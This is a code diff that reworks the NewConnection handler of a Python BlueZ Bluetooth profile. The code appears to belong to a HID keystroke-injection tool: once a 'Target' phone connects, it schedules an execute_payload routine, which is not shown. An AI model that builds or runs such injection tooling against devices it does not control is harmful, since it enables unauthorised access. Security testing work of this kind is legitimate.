@@ -145,20 +145,29 @@ class BTProfile(dbus.service.Object):
 
     @dbus.service.method("org.bluez.Profile1", in_signature="oha{sv}", out_signature="")
     def NewConnection(self, path, fd, properties):
-        print(f"NewConnection from {path}")
-        self.fd = fd.take() # Take ownership of the file descriptor
+        print(f"DEBUG: NewConnection triggered from {path}")
         
-        # Wrap the raw fd in a Python socket
-        # L2CAP sockets for HID usually use SOCK_SEQPACKET
         try:
+            # 1. Get the file descriptor
+            self.fd = fd.take()
+            print(f"DEBUG: File descriptor {self.fd} taken successfully.")
+
+            # 2. Setup the socket
+            # Note: valid L2CAP sockets must be non-blocking or have timeouts handled carefully
             self.intr_socket = socket.fromfd(self.fd, socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET)
-            self.is_connected = True
-            print("Target Connected. Waiting 2 seconds for stability...")
+            self.intr_socket.setblocking(True) 
             
-            # Non-blocking payload execution
-            GLib.timeout_add(2000, self.execute_payload) 
+            self.is_connected = True
+            print("Target Connected! Waiting 2 seconds for stability...")
+            
+            # 3. Schedule payload
+            GLib.timeout_add(2000, self.execute_payload)
+            
         except Exception as e:
-            print(f"Failed to create socket: {e}")
+            print(f"CRITICAL ERROR in NewConnection: {e}")
+            # If we fail here, close the fd so the phone knows we failed
+            if self.fd > -1:
+                os.close(self.fd)
 
     @dbus.service.method("org.bluez.Profile1", in_signature="o", out_signature="")
     def RequestDisconnection(self, path):
